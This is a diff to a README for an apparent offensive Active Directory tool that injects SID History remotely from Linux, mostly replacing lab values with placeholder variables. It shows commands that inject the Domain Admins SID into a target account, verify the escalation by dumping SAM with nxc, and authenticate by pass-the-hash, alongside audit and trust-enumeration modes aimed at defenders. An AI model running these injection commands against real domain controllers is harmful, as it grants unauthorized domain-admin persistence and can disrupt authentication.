@@ -2,7 +2,8 @@
 
 Remote SID History injection & auditing from Linux.
 
-> **Warning** — The DSInternals method **stops the NTDS service** on the target DC to modify `ntds.dit` offline. This causes a brief authentication outage (~5-10s) and carries a risk of service disruption if the restart fails. **Do not run against production domain controllers.** This tool is intended for authorized security assessments, lab environments, and blue team research (IoC identification, detection engineering). Run it from Linux, not Windows. Provided as-is with no support guarantee.
+> [!WARNING]
+> The DSInternals method **stops the NTDS service** on the target DC to modify `ntds.dit` offline, causing a brief authentication outage (~5-10s) with a risk of service disruption if the restart fails. **Do not run against production domain controllers.** This tool is intended for authorized security assessments, lab environments, and blue team research (IoC identification, detection engineering). Run from Linux only. Provided as-is with no support guarantee.
 
 > *"There is currently no way to exploit this technique purely from a distant UNIX-like machine"* — [The Hacker Recipes](https://www.thehacker.recipes/ad/persistence/sid-history)
 
@@ -15,15 +16,15 @@ This is a persistence technique ([T1134.005](https://attack.mitre.org/techniques
 ## Quick demo
 
 ```bash
-# 1. Verify user1 has no sIDHistory
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --query user1
+# 1. Verify $TARGET has no sIDHistory
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --query $TARGET
 
 # 2. Inject Domain Admins SID
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
-    --target user1 --inject domain-admins --force
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --force
 
-# 3. Confirm — user1 dumps SAM without being in Domain Admins
-nxc smb 192.168.56.10 -u user1 -p Password123! -d lab1.local --sam
+# 3. Confirm — $TARGET dumps SAM without being in Domain Admins
+nxc smb $DC_IP -u $TARGET -p $PASSWORD -d $DOMAIN --sam
 ```
 
 **Before** — no admin shares, no sIDHistory:
@@ -58,16 +59,16 @@ Stops NTDS, modifies `ntds.dit` offline via DSInternals, restarts NTDS. Works sa
 
 ```bash
 # Same-domain: inject Domain Admins
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
-    --target user1 --inject domain-admins --force
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --force
 
-# Cross-domain: inject DA of lab2.local
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
-    --target user1 --inject domain-admins --inject-domain lab2.local --force
+# Cross-domain: inject DA from a foreign domain
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --inject-domain $FOREIGN_DOMAIN --force
 
 # Raw SID
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
-    --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512 --force
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject $SID --force
 ```
 
 **Trade-offs:** ~5-10s NTDS downtime, creates a temporary service, disk artifacts. Auto-cleanup after execution. In multi-DC environments, other DCs continue serving authentication.
@@ -77,9 +78,10 @@ python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 
 Calls `DRSAddSidHistory` (opnum 20) over RPC. No disk writes, no service, no NTDS downtime. Limited to RID > 1000 due to SID filtering at forest trust boundaries.
 
 ```bash
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
-    --target user1 --method drsuapi --source-user da-admin2 --source-domain lab2.local \
-    --src-username da-admin2 --src-password Password123! --src-domain lab2.local
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --method drsuapi \
+    --source-user $SRC_USER --source-domain $SRC_DOMAIN \
+    --src-username $SRC_USER --src-password $SRC_PASSWORD --src-domain $SRC_DOMAIN
 ```
 
 **Prerequisites:** cross-forest trust, auditing enabled on both DCs, audit groups (`$DOMAIN$$$`) on both sides, DA on destination domain.
@@ -100,23 +102,23 @@ python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 
 
 ```bash
 # Query sIDHistory of a specific user
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --query user1
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --query $TARGET
 
 # Domain-wide audit with risk assessment
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --audit
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --audit
 
 # JSON export for SIEM integration
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
     --audit -o json --output-file audit.json
 
 # Enumerate domain trusts and SID filtering status
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --enum-trusts
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --enum-trusts
 
 # SID lookup
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --lookup user1
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --lookup $TARGET
 
 # List injectable presets
-python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --list-presets
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --list-presets
 ```
 
 ---
@@ -125,11 +127,11 @@ python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 
 
 | Method | Flags |
 |--------|-------|
-| NTLM (password) | `-u USER -p PASSWORD` |
-| Pass-the-Hash | `-u USER --ntlm-hash NT_HASH` |
-| Kerberos | `--kerberos --ccache ccache_file` |
-| Certificate (PTC) | `--certificate --cert-file cert.pem --key-file key.pem` |
-| SIMPLE bind | `--simple -u USER -p PASSWORD --use-ssl` |
+| NTLM (password) | `-u $USER -p $PASSWORD` |
+| Pass-the-Hash | `-u $USER --ntlm-hash $NT_HASH` |
+| Kerberos | `--kerberos --ccache $CCACHE` |
+| Certificate (PTC) | `--certificate --cert-file $CERT_FILE --key-file $KEY_FILE` |
+| SIMPLE bind | `--simple -u $USER -p $PASSWORD --use-ssl` |
 
 ---
 
